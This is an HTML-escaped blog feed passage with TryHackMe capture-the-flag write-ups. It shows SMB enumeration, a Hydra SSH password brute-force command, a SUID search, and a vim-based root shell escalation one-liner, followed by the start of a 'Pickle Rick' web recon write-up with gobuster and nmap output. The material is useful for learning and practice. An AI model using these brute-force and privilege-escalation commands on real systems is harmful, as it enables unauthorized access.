&lt;p&gt;A bit more internet searching and I arrive at &lt;a href=&quot;https://null-byte.wonderhowto.com/how-to/enumerate-smb-with-enum4linux-smbclient-0198049/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Enumerate SMB with Enum4linux &amp;#x26; Smbclient&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;, which suggests using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/enum4linux&quot; class=&quot;internal&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;enum4linux&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -U&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;But this errors out on me before outputting any useful information. (It did list a user named krbtgt, but after getting excited and thinking this might be “K” I realized that this looked like it might be related to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/kerberos&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/kerberos&quot;&gt;Kerberos&lt;/a&gt;… And a brief internet search confirmed this.)&lt;/p&gt;
&lt;p&gt;Trying to use the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/metasploit&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/metasploit&quot;&gt;Metasploit&lt;/a&gt; module auxiliary/smb/smb_lookupsid as suggested in &lt;a href=&quot;https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;A Little Guide to SMB Enumeration&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; just resulted in an error about the server not being “able to handle the encrypted request.”&lt;/p&gt;
&lt;p&gt;Switching back to trying to get &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/enum4linux&quot; class=&quot;internal&quot; data-slug=&quot;spells/enum4linux&quot;&gt;enum4linux&lt;/a&gt; to work, I tried calling it &lt;em&gt;without&lt;/em&gt; the -U flag. This does a full enumeration, and in particular tries to “brute-force” usernames by guessing SIDs. This worked! (I still got the same error, but the enumeration continued…)&lt;/p&gt;
&lt;p&gt;Let’s turn back to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/hydra&quot;&gt;Hydra&lt;/a&gt;, but now using the usernames we just found. I’m also going to try a shorter wordlist, because rockyou.txt is ridiculously long.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;hydra&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -t&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; $USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -P&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/nmap.lst&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;      -vV&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.74.250&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ssh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;We’ve got a match, and we’re in!&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;env&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; SSH_AUTH_SOCK&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; SSH_AGENT_PID&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;	ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#B07D48&quot;&gt; $USERNAME&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;@10.10.74.250&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;h2 id=&quot;flag-6&quot;&gt;Flag 6&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#flag-6&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Now that we’re in, let’s see if we can escalate privileges.&lt;/p&gt;
&lt;p&gt;The home directory we’re in is a little weird… It contains a single file (~/.lesshst), and is owned by root!&lt;/p&gt;
&lt;p&gt;Home directories are world-readable, so we can see what’s in the other user’s home. It looks more normal… But also contains a file called pass.bak, which looks like it might be our last flag (“the final password”). Unfortunately, it’s not world-readable, and neither are any of the history files in that directory.&lt;/p&gt;
&lt;p&gt;Does the current user have &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/sudo&quot; class=&quot;internal&quot; data-slug=&quot;spells/sudo&quot;&gt;sudo&lt;/a&gt; privileges? Running &lt;code&gt;sudo -l&lt;/code&gt; suggests not.&lt;/p&gt;
&lt;p&gt;Let’s see if there are any interesting binaries on the system that the current user both has access to and I could potentially abuse.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;find&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -type&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; f&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;       -a&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \(&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -u+s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -perm&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -g+s&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;       -exec&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; ls&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -l&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; {}&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#AB5959;--shiki-dark:#AB5959&quot;&gt; 2&gt;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /dev/null&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;And… /usr/bin/vim.basic is SUID root?!? &lt;a href=&quot;https://gtfobins.github.io/gtfobins/vim/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;GTFOBins suggests that this can lead to a privilege escalation if ViM is compiled with Python…&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; And, indeed, running &lt;code&gt;vim.basic --version&lt;/code&gt; reveals that this is the case.&lt;/p&gt;
&lt;p&gt;Adapting the escape from GTFOBins for the present case gives us:&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;vim.basic&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -c&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt; &#039;&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt;:py3 import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B5695977;--shiki-dark:#B5695977&quot;&gt;&#039;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;And this indeed gives us root! With this new power, we can enter the second user’s home directory and read pass.bak for our final flag.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Elapsed Time:&lt;/strong&gt; 3 h 19 min&lt;/p&gt;</description>
    <pubDate>Thu, 04 Nov 2021 00:00:00 GMT</pubDate>
  </item><item>
    <title>Pickle Rick</title>
    <link>https://cardboard-iguana.com/grimoire/tales/2021-10-10-pickle-rick</link>
    <guid>https://cardboard-iguana.com/grimoire/tales/2021-10-10-pickle-rick</guid>
    <description>&lt;h2 id=&quot;background&quot;&gt;Background&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#background&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;This is a &lt;a href=&quot;https://en.wikipedia.org/wiki/Rick_and_Morty&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Rick &amp;#x26; Morty&lt;svg class=&quot;external-icon&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; themed web server / CTF. The fact that I’ve never watched the show may put me at a disadvantage.&lt;/p&gt;
&lt;p&gt;There are three flags (“ingredients Rick needs for a potion to transform themself from a pickle back into a human”). Because of how TryHackMe masks answers, we already know the basic form of these strings (&lt;code&gt;*&lt;/code&gt; characters are unknown, but &lt;code&gt; &lt;/code&gt; and &lt;code&gt;.&lt;/code&gt; characters are literals):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Flag 1: **. ******* ****
Flag 2: * ***** ****
Flag 3: ***** *****
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I’m guessing that flag 1 begins with either numbers or an abbreviation (&lt;code&gt;Mr.&lt;/code&gt;?). Flag 2 probably begins with &lt;code&gt;A&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Because this is web server exploitation, it’s going to make sense to use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/burp-suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/burp-suite&quot;&gt;Burp Suite&lt;/a&gt;. In order to make the experience a little more pleasant, I’m going to add a pattern of &lt;code&gt;10.10.158.139&lt;/code&gt; (the IP address of the TryHackMe server I’m using) to FoxyProxy and then set it to “Use proxies based on their pre-defined patterns and priorities”; that way, only the CTF website will get proxied to &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/burp-suite&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/burp-suite&quot;&gt;Burp Suite&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;recon&quot;&gt;Recon&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#recon&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;The server is running Apache 2.4.18 on some version of Ubuntu. The provided web page is very simple:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;HELP MORTY!&lt;/p&gt;
&lt;p&gt;Listen Morty… I need your help, I’ve turned myself into a pickle again and this time I can’t change back!&lt;/p&gt;
&lt;p&gt;I need you to &lt;em&gt;BURRRP&lt;/em&gt;… Morty, logon to my computer and find the last three secret ingredients to finish my pickle-reverse potion. The only problem is, I have no idea what the &lt;em&gt;BURRRRRRRRP&lt;/em&gt;, password was! Help Morty, Help!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;There is no obvious place to login, upload files, or otherwise interact with the web server. No hint event that this is anything beyond a relatively static site (both jQuery and Bootstrap libraries are included, but there’s no hooks in the actual page.)&lt;/p&gt;
&lt;p&gt;There’s a comment in the HTML that Rick’s username is &lt;code&gt;R1ckRul3s&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;We look for directories of interest using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/gobuster&quot; class=&quot;internal&quot; data-slug=&quot;spells/gobuster&quot;&gt;gobuster&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;gobuster&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; dir&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-u&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; http://10.10.158.139&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;	-w&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Discovered directories:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;/assets (website assets + a handful of Rick &amp;#x26; Morty image files)&lt;/li&gt;
&lt;li&gt;/server-status (returns 403)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Also probing the machine using &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/nmap&quot;&gt;Nmap&lt;/a&gt;.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -vv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; pickle-rick&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#2F798A&quot;&gt; 10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Output:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sun Oct 10 14:17:34 2021 as: nmap -vv -A -oA pickle-rick -sS -p- 10.10.158.139
Nmap scan report for 10.10.158.139
Host is up, received echo-reply ttl 61 (0.16s latency).
Scanned at 2021-10-10 14:17:36 MDT for 862s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 1d:39:9b:09:99:36:f3:bc:fe:7c:83:99:92:3b:a7:6b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNZgE8CuciddazUr3rzoeSLp5UUW7FSMH7iGPEnz6E0GioM0ctbDfUtlp2jEOcetG3lnKzzD1JMPBh98h7ImpMSdpOMHRliy58a5CaBDv7O2boOUYrw0BiL9xHjEoeewTuKqHrsOal+o2M/Cmiho6K0FcHBmmf0/COnaT824p6XK5z7PYLuwoMF2Ujimz2hIFCFRn3eID0nCiMXxOUVI0Gn+m1xSDdOIqO7n9btU0oknWQ/QHbEMwVi/Hdv5b7xoO/MqiEAKVmvmsA483n8+uqhjmVXeYr/r588dUod0M1EY56RLgeiSnFWZ5D1bGxknmd+wh64At8MG4jZyDEhuVZ
|   256 ab:aa:da:0b:5b:22:01:bc:75:54:91:e8:2a:b6:60:9e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP74j/YgHBTZzXewO7k01lKCsNhH0h+qZBH5pvKkwoLvkiwVrmFMphtT+cHsdV5KnijsoRQtMolZyblXdHbVoOQ=
|   256 7f:32:1f:37:2a:58:e7:d0:fb:91:a4:8c:12:8e:2e:d6 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFz+Ck64qc+5h2JvTgz7WYaLU4z+yu79Ug8CaW2vgP/9
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=10/10%OT=22%CT=1%CU=34787%PV=Y%DS=4%DC=T%G=Y%TM=61634D
OS:BE%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%II=I%T
OS:S=8)SEQ(SP=105%GCD=1%ISR=10E%TI=Z%CI=I%TS=8)OPS(O1=M506ST11NW7%O2=M506ST
OS:11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST11NW7%O6=M506ST11)WIN(W1=6
OS:8DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M
OS:506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.017 days (since Sun Oct 10 14:06:48 2021)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   31.96 ms  10.13.0.1
2   ... 3
4   172.74 ms 10.10.158.139

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Oct 10 14:31:58 2021 -- 1 IP address (1 host up) scanned in 864.62 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Try to get some more information by connecting with ssh.&lt;/p&gt;
&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-light&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#59873A&quot;&gt;ssh&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; -F&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; /dev/null&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt; \&lt;/span&gt;&lt;/span&gt;
&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#A65E2B&quot;&gt;    -o&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; IdentityAgent=none&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#B56959&quot;&gt; R1ckRul3s@10.10.158.139&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
&lt;p&gt;Looks like password authentication is turned off — only the publickey method is available. So no brute forcing here — we need Rick’s private &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; key.&lt;/p&gt;
&lt;p&gt;No obvious Apache or &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spellbook/ssh&quot; class=&quot;internal alias&quot; data-slug=&quot;spellbook/ssh&quot;&gt;SSH&lt;/a&gt; RCEs for this version in Exploit DB…&lt;/p&gt;
